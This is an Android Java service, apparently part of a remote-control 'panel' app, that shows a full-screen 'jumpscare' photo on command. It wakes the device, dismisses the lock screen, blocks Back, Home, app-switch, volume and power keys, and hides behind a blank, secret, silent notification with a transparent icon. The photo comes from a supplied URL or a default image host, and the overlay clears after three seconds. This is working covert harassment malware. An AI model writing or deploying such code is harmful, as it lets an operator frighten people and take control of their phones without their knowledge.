package com.nex.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.ImageView;

import androidx.core.app.NotificationCompat;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * JumpscarePhotoService — Tampilkan foto dari URL secara fullscreen tiba-tiba (jumpscare).
 *
 * Alur:
 *  1. Terima ACTION_JUMPSCARE_PHOTO + EXTRA_URL (URL gambar)
 *  2. Download gambar dari URL (background thread)
 *  3. Tampilkan fullscreen overlay hitam + gambar center-crop
 *  4. Setelah DISPLAY_DURATION_MS (3 detik) → hapus overlay, HP kembali normal
 *
 * Jika download gagal → tetap tampilkan overlay hitam lalu auto dismiss.
 */
public class JumpscarePhotoService extends Service {

    private static final String TAG      = "JumpscarePhotoSvc";
    private static final String CHANNEL  = "nex_jumpscare_photo";
    private static final int    NOTIF_ID = 9989;

    // Durasi tampil foto sebelum auto dismiss (ms)
    private static final long DISPLAY_DURATION_MS = 3000L; // 3 detik

    // Timeout download gambar (ms)
    private static final int DOWNLOAD_TIMEOUT_MS = 8000;

    public static final String ACTION_JUMPSCARE_PHOTO = "com.nex.panel.ACTION_JUMPSCARE_PHOTO";
    public static final String EXTRA_URL              = "photo_url";

    // URL default jika tidak ada URL dari command
    public static final String DEFAULT_URL = "https://files.catbox.moe/8a9kxk.jpg";

    private WindowManager         wm;
    private FrameLayout           overlayRoot;
    private ImageView             ivPhoto;
    private PowerManager.WakeLock wakeLock;

    private final Handler       uiHandler  = new Handler(Looper.getMainLooper());
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    // Runnable auto dismiss setelah DISPLAY_DURATION_MS
    private final Runnable dismissRunnable = this::cleanupAndStop;

    // ── Lifecycle ─────────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification());
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;
        if (!ACTION_JUMPSCARE_PHOTO.equals(intent.getAction())) return START_NOT_STICKY;

        String rawUrl = intent.getStringExtra(EXTRA_URL);
        final String photoUrl = (rawUrl != null && !rawUrl.trim().isEmpty())
            ? rawUrl.trim() : DEFAULT_URL;

        Log.d(TAG, "Jumpscare photo dari URL: " + photoUrl);

        // Langsung tampilkan overlay hitam dulu (agar terasa "tiba-tiba")
        // lalu download gambar di background dan pasang ke ImageView
        uiHandler.post(() -> {
            showBlankOverlay();         // overlay hitam muncul LANGSUNG
            downloadAndShow(photoUrl);  // download di background, pasang setelah siap
        });

        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        uiHandler.removeCallbacks(dismissRunnable);
        executor.shutdownNow();
        removeOverlay();
        releaseWakeLock();
        super.onDestroy();
    }

    // ── STEP 1 — Tampilkan overlay hitam fullscreen langsung ─────────────
    private void showBlankOverlay() {
        try {
            if (overlayRoot != null) return;

            // Root hitam fullscreen
            FrameLayout root = new FrameLayout(this);
            root.setBackgroundColor(Color.BLACK);
            root.setFocusable(true);
            root.setFocusableInTouchMode(true);
            // Blokir tombol hardware selama jumpscare berlangsung
            root.setOnKeyListener((v, keyCode, event) ->
                keyCode == KeyEvent.KEYCODE_BACK        ||
                keyCode == KeyEvent.KEYCODE_HOME        ||
                keyCode == KeyEvent.KEYCODE_APP_SWITCH  ||
                keyCode == KeyEvent.KEYCODE_VOLUME_UP   ||
                keyCode == KeyEvent.KEYCODE_VOLUME_DOWN ||
                keyCode == KeyEvent.KEYCODE_POWER
            );

            // ImageView untuk foto — center crop agar memenuhi layar
            ImageView iv = new ImageView(this);
            iv.setScaleType(ImageView.ScaleType.CENTER_CROP);
            FrameLayout.LayoutParams ivLP = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT,
                Gravity.CENTER
            );
            root.addView(iv, ivLP);

            overlayRoot = root;
            ivPhoto     = iv;

            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                // TIDAK pakai FLAG_NOT_FOCUSABLE agar setOnKeyListener aktif
                // TIDAK pakai FLAG_NOT_TOUCHABLE agar user tidak bisa dismiss
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN  |
                WindowManager.LayoutParams.FLAG_FULLSCREEN         |
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED   |
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD   |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON     |
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
                PixelFormat.OPAQUE
            );
            params.gravity = Gravity.TOP | Gravity.START;

            wm.addView(overlayRoot, params);
            acquireWakeLock();
            Log.d(TAG, "Blank overlay shown");

        } catch (Exception e) {
            Log.e(TAG, "showBlankOverlay error: " + e.getMessage());
        }
    }

    // ── STEP 2 — Download gambar di background, pasang ke ImageView ───────
    private void downloadAndShow(String photoUrl) {
        executor.execute(() -> {
            Bitmap bitmap = downloadBitmap(photoUrl);
            uiHandler.post(() -> {
                // Pasang gambar ke overlay (sudah tampil hitam)
                if (ivPhoto != null && bitmap != null) {
                    ivPhoto.setImageBitmap(bitmap);
                    Log.d(TAG, "Photo loaded — size: " + bitmap.getWidth() + "x" + bitmap.getHeight());
                } else {
                    Log.w(TAG, "Bitmap null atau ivPhoto null — overlay tetap hitam");
                }
                // Jadwalkan auto dismiss setelah DISPLAY_DURATION_MS
                uiHandler.postDelayed(dismissRunnable, DISPLAY_DURATION_MS);
            });
        });
    }

    // ── Download bitmap dari URL ──────────────────────────────────────────
    private Bitmap downloadBitmap(String imageUrl) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(imageUrl);
            conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(DOWNLOAD_TIMEOUT_MS);
            conn.setReadTimeout(DOWNLOAD_TIMEOUT_MS);
            conn.setRequestProperty("User-Agent", "NexPanel/1.0");
            conn.setDoInput(true);
            conn.connect();

            int responseCode = conn.getResponseCode();
            if (responseCode != HttpURLConnection.HTTP_OK) {
                Log.e(TAG, "HTTP error: " + responseCode);
                return null;
            }

            InputStream is = conn.getInputStream();
            Bitmap bmp = BitmapFactory.decodeStream(is);
            is.close();
            return bmp;

        } catch (Exception e) {
            Log.e(TAG, "downloadBitmap error: " + e.getMessage());
            return null;
        } finally {
            if (conn != null) {
                try { conn.disconnect(); } catch (Exception ignored) {}
            }
        }
    }

    // ── Hapus overlay dan hentikan service ────────────────────────────────
    private void cleanupAndStop() {
        removeOverlay();
        releaseWakeLock();
        Log.d(TAG, "Jumpscare photo done — HP kembali normal");
        stopSelf();
    }

    private void removeOverlay() {
        try {
            if (overlayRoot != null && wm != null) {
                try { wm.removeView(overlayRoot); } catch (Exception ignored) {}
                overlayRoot = null;
                ivPhoto     = null;
            }
        } catch (Exception ignored) {}
    }

    // ── WakeLock ──────────────────────────────────────────────────────────
    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && (wakeLock == null || !wakeLock.isHeld())) {
                wakeLock = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
                    PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "NexPanel:JumpscarePhoto"
                );
                // Max 30 detik — cukup lebih dari DISPLAY_DURATION_MS
                wakeLock.acquire(30 * 1000L);
            }
        } catch (Exception ignored) {}
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception ignored) {}
    }

    // ── Notification Channel ──────────────────────────────────────────────
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel ch = new NotificationChannel(
                    CHANNEL, "Jumpscare Photo", NotificationManager.IMPORTANCE_NONE);
                ch.setSound(null, null);
                ch.setShowBadge(false);
                ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) nm.createNotificationChannel(ch);
            } catch (Exception e) {
                Log.e(TAG, "createNotificationChannel error: " + e.getMessage());
            }
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(false)
            .build();
    }
}
